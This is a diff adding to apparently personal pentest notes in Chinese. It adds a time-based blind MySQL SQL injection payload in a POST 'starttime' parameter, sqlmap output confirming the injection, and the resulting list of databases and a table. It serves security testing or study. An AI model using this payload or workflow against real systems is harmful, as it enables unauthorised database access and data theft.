@@ -118,4 +118,45 @@ sqlmap跑post注入，可与bp结合
 
 
 
+```
+view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
+```
+```
+sqlmap identified the following injection point(s) with a total of 445 HTTP(s) requests:
+---
+Parameter: starttime (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: view=month&starttime=1595779200') AND (SELECT 6129 FROM (SELECT(SLEEP(5)))lWYm) AND ('nXWx'='nXWx&endtime=1599408000&callback=undefined
+---
+[12:01:43] [INFO] the back-end DBMS is MySQL
+[12:01:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+back-end DBMS: MySQL >= 5.0.12
+[12:01:44] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 4 times
+[12:01:44] [INFO] fetched data logged to text files under 'C:\Users\YQ5\AppData\Local\sqlmap\output\192.168.199.208'
+[12:01:44] [WARNING] you haven't updated sqlmap for more than 72 days!!!
 
+[*] ending @ 12:01:44 /2020-08-23/
+
+```
+
+```
+available databases [8]:
+[*] BUS
+[*] crscell
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] TD_APP
+[*] TD_OA
+[*] TD_OA_ARCHIVE
+```
+```
+post_tel
+Database: BUS
+[1 table]
++----------+
+| post_tel |
++----------+
+```
